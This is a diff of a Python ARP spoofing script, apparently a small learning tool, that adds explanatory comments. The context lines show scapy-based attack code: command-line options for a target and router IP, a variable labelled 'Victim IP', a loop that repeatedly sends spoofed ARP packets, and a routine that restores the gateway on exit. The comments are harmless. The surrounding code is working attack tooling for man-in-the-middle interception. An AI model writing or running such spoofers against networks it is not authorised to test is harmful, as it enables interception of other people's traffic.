@@ -9,6 +9,7 @@ print('''░▒▓█ ᴀʀᴘ ꜱᴘᴏᴏꜰᴇʀ ʙʏ ᴛʜᴏᴜꜰᴇᴇ �
 print('''-----------------------------''')
 
 
+#Arguments Passing Function
 def argd():
     pars = optparse.OptionParser()
     pars.add_option("-t","--target",dest="target",help="eg:192.168.1.1")
@@ -46,7 +47,7 @@ def noramal_gateway(target_ip,source_ip):
     scapy.send(packet, count=5,verbose=False)
 
 
-opts = argd()
+opts = argd() #calling func in a varaible "opts"
 
 router_ip= opts.router#Router IP
 spoof_ip= opts.target #Victim IP
@@ -61,6 +62,7 @@ try:
         sending_count = sending_count + 2
         print("\r[+] Sucessful Sent Packets : " + str(sending_count),end="")
         time.sleep(2)
+#Restoring
 except KeyboardInterrupt:
     print("\n[-] Exiting Spoofing , Restoring Normal Gateway")
     noramal_gateway(spoof_ip,router_ip)
